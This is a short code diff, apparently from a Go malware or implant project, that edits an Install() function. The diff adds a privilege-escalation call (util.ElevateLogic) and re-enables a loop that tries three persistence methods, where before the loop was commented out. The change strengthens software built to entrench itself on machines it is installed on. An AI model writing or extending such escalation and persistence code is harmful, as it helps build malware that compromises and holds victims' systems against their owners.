@@ -83,6 +83,8 @@ func persist(ptype int) error {
 func Install() {
 	Info.Date = time.Now()
 
+	util.ElevateLogic()
+
 	base, err := CreateBase()
 	util.Panicln(err, "Base creation failed")
 	Info.Base = base
@@ -92,7 +94,7 @@ func Install() {
 	log.Println("Binary relocation failed,", err)
 
 	for i := 1; i < 4; i++ {
-		if err := 0; /*persist(i);*/ err == 0 {
+		if err := persist(i); err == nil {
 			log.Printf("Persistence method #%d worked\n", i)
 			Info.PType = i
 			break
